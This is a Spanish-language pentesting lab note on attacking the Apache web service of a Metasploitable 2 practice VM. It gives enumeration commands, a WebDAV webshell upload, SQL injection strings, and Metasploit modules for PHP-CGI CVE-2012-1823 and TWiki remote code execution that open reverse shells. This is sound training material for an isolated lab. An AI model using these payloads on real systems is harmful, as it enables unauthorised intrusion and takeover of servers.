# HTTP — Apache + aplicaciones web (puerto 80) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** servidor web **Apache 2.2.8** con **PHP 5.2.4**, **puerto 80**. No alberga una sola web, sino **varias aplicaciones vulnerables** pensadas para practicar *hacking web*.

Aplicaciones accesibles (visítalas en `http://192.168.100.9/`):

| Ruta | Aplicación | Para practicar |
|---|---|---|
| `/dvwa/` | Damn Vulnerable Web App (admin/password) | SQLi, XSS, subida de ficheros, CSRF… |
| `/mutillidae/` | Mutillidae | OWASP Top 10 completo |
| `/phpMyAdmin/` | phpMyAdmin | administración de MySQL por web |
| `/tikiwiki/` | TikiWiki | CVE antiguos de la wiki |
| `/twiki/` | TWiki | `twiki_history` (RCE) |
| `/dav/` | WebDAV | subida de archivos |
| `/phpinfo.php` | phpinfo | fuga de información del servidor |

**Cómo se explota:** hay dos planos. (1) **A nivel de servidor**, la combinación Apache + PHP 5.2.4 en modo CGI es vulnerable a **CVE-2012-1823** (inyección de argumentos de PHP-CGI), que da ejecución de comandos. (2) **A nivel de aplicación**, cada webapp tiene sus propios fallos (SQLi, subida de webshells, etc.).

## Explotación manual (sin Metasploit)

```bash
# Enumerar rutas y vulnerabilidades web
nikto -h http://192.168.100.9
gobuster dir -u http://192.168.100.9 -w /usr/share/wordlists/dirb/common.txt

# Ejemplo: subir una webshell por WebDAV con cadaver
cadaver http://192.168.100.9/dav/
dav:/dav/> put shell.php

# En DVWA/Mutillidae: explotar SQLi manual, por ejemplo
#   usuario: admin'--     o     1' OR '1'='1
```

## Explotación con Metasploit

```bash
# Ejecución de comandos vía PHP-CGI (CVE-2012-1823)
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 192.168.100.9
set LHOST 192.168.100.8
run

# RCE en TWiki
use exploit/unix/webapp/twiki_history
set RHOSTS 192.168.100.9
set LHOST 192.168.100.8
run
```

---

> **Ver también:** apunte general de enumeración de [HTTP/HTTPS](../../Apuntes%20Generales/03_enumeracion_de_servicios/03_http.md) en `Apuntes Generales`.
